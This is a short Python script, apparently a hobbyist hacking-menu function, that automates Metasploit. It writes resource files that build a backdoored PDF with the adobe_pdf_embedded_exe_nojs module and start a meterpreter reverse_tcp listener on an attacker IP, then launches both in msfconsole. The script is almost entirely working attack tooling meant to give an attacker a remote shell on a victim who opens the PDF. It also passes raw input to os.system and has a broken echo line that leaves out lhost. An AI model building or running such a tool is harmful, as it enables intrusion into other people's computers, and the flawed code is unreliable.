#CREADO POR GEERXOS GITHUB: https://github.com/GeerxOS


import os

banner="""

 /'\_/`\          /'___\ 
/\      \    ____/\ \__/ 
\ \ \__\ \  /',__\ \ ,__|
 \ \ \_/\ \/\__, `\ \ \_/                 
  \ \_\\ \_\/\____/\ \_\ 
   \/_/ \/_/\/___/  \/_/ 

/\  _`\ /\ \            /\_ \  /\_ \     
\ \,\L\_\ \ \___      __\//\ \ \//\ \    
 \/_\__ \\ \  _ `\  /'__`\\ \ \  \ \ \   
   /\ \L\ \ \ \ \ \/\  __/ \_\ \_ \_\ \_ 
   \ `\____\ \_\ \_\ \____\/\____\/\____|
    \/_____/\/_/\/_/\/____/\/____/\/____/

"""

def adobe_exe():
    os.system("clear")
    print(banner)
    print("Using: exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs")
    filename = input("File name: ")
    lhost = input("Attacker IP: ")
    lport = input("Listen port: ")
    print("Ok!")
    print("+------------------------------------------------------------------+ ")
    print("+-> Exploit data")
    print("+-> Auxiliary: exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs")
    print("+-> Filename: "+filename+"")
    print("+-> Attacker IP: "+lhost+"")
    print("+-> Listen Port: "+lport+"")
    print("+------------------------------------------------------------------+ ")
    print("Running metasploit...")
    # se crea el .rb del pdf
    os.system("echo 'use exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs' >> adobe_pdfjs.rb")
    os.system("echo 'set filename "+filename+".pdf' >> adobe_pdfjs.rb")
    os.system("echo 'set lhost "+lhost+"' adobe_pdfjs.rb")
    os.system("echo 'set lport "+lport+"' >> adobe_pdfjs.rb")
    os.system("echo 'exploit' >> adobe_pdfjs.rb")
    # ahora se crea el listener para esperar a que la victima abra el pdf backdoor
    os.system("echo 'use exploit/multi/handler' >> adobejs_listener.rb")
    os.system("echo 'set payload windows/meterpreter/reverse_tcp' >> adobejs_listener.rb")
    os.system("echo 'set lhost "+lhost+"' >> adobejs_listener.rb")
    os.system("echo 'set lport "+lport+"' >> adobejs_listener.rb")
    os.system("echo 'exploit' >> adobejs_listener.rb")
    # ahora se lanzan las terminales de metasploit
    # lanza la terminal de crear pdf
    os.system("gnome-terminal -- msfconsole -r adobe_pdfjs.rb &")
    # lanza la terminal del listener
    os.system("gnome-terminal -- msfconsole -r adobejs_listener.rb &")
    input("Enter to return to the menu! ")
    os.system("clear")